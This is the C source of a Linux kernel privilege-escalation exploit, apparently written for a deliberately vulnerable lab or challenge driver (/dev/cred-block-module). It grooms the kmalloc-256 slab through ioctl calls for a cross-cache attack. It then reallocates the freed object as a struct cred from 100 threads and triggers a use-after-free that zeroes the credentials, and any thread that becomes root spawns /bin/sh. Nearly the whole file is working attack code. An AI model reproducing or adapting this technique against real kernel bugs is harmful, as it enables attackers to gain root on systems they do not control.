#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <err.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <sched.h>


#define DRIVER "/dev/cred-block-module"

#define IOCTL_FREE 0x1337
#define IOCTL_ALLOC 0x1338
#define IOCTL_SET_CURRENT 0x1339
#define IOCTL_RESET_CURRENT 0x1340
#define IOCTL_RESET_MODULE 0x1341

#define N_THREADS 100

pthread_t threads[N_THREADS];
pthread_barrier_t b1;
pthread_barrier_t b2;
pthread_barrier_t b3;

// Setuid will allocate a new cred structure. Found in kernel module source
#define __NR_setuid 105
void *thread_func() {
    int my_uid = getuid();
    
    // Wait for cross cache attack
    pthread_barrier_wait(&b1);
    
    // Allocates new cred struct. Using pure syscall to only allocate a single cred struct
    syscall(__NR_setuid, my_uid);

    // Wait for cred struct overwrite
    pthread_barrier_wait(&b2);
    
    // Check if UID changed, if so, spawn shell
    my_uid = getuid();
    if (!my_uid) {
        printf("*** thread is root ***\n");        
        fflush(stdout);
        system("/bin/sh");
    }        
    
    pthread_barrier_wait(&b3);
    return 0;
}

int blocks[100];

// Found in /proc/slabinfo and /sys/kernel/slab/kmalloc-256
#define OBJ_PER_SLAB 21
#define CPU_PARTIAL 30
#define DEFRAG 50
#define FILLED_CPU_PARTIAL (OBJ_PER_SLAB * (1 + CPU_PARTIAL)) 


void alloc_n(int fd, int n) {
    for (int i = 0; i < n; ++i) {
        ioctl(fd, IOCTL_ALLOC, 0);
    }
}

void free_n(int fd, int start, int end) {
    for (int i = start; i < end; ++i) {
        ioctl(fd, IOCTL_FREE, i);
    }
}


int main() {
    // Initiate driver
    int fd = open(DRIVER, O_RDWR);
    if (fd < 0)
        err(1, "Failed to open " DRIVER);

    pthread_barrier_init(&b1, NULL, N_THREADS+1);
    pthread_barrier_init(&b2, NULL, N_THREADS+1);
    pthread_barrier_init(&b3, NULL, N_THREADS+1);

    printf("spawning threads\n");
    for (int i = 0; i < N_THREADS; ++i) {
        pthread_create(&threads[i], NULL, thread_func, NULL);
    }

    printf("cross-cache attack begins\n");
    
    // defragment slabs
    printf("  defragment\n");
    alloc_n(fd, DEFRAG);

    // fill cpu partial
    printf("  fill cpu partial list\n");
    alloc_n(fd, FILLED_CPU_PARTIAL);

    // prefill vuln slab
    printf("  prefill target\n");
    alloc_n(fd, OBJ_PER_SLAB - 1);    

    // allocate target
    // Set as current!
    int target_index = ioctl(fd, IOCTL_ALLOC, 0);
    printf("  allocated target block at index %d\n", target_index);
    ioctl(fd, IOCTL_SET_CURRENT, target_index);
    
    // postfill vuln
    printf("  postfill target\n");
    alloc_n(fd, OBJ_PER_SLAB + 1);
    
    // free vuln, prefill and postfill
    int start = DEFRAG+FILLED_CPU_PARTIAL;
    int end = target_index + 1 + OBJ_PER_SLAB;
    printf("  free target index %d\n", target_index);
    ioctl(fd, IOCTL_FREE, target_index);
    printf("  free surrounding objects\n");
    free_n(fd, start, target_index);
    free_n(fd, target_index+1, end);

    // Victim slab page should now be empty, try push it to the page allocator
    // by freeing 1 object per slab
    printf("  fill cpu_partial list by freeing every %dth block from index %d-%d\n",
           OBJ_PER_SLAB, DEFRAG, DEFRAG+FILLED_CPU_PARTIAL-1);
    for (int i = DEFRAG; i < DEFRAG + FILLED_CPU_PARTIAL; ++i) {
        if (!(i % (OBJ_PER_SLAB))) {
            ioctl(fd, IOCTL_FREE, i);
        }
    }

    // Vuln object should be at the page allocator! 
    // Reallocate the vulnerable object with a struct cred 
    printf("cross-cache done!\n");
    printf("signaling threads to allocate cred struct\n");
    pthread_barrier_wait(&b1);    
            
    // Overwrite the cred struct by triggering UAF 
    printf("overwrite credentials with 0 by resetting current block\n");
    ioctl(fd, IOCTL_RESET_CURRENT);
    pthread_barrier_wait(&b2);
    
    pthread_barrier_wait(&b3);

    return 0;
}
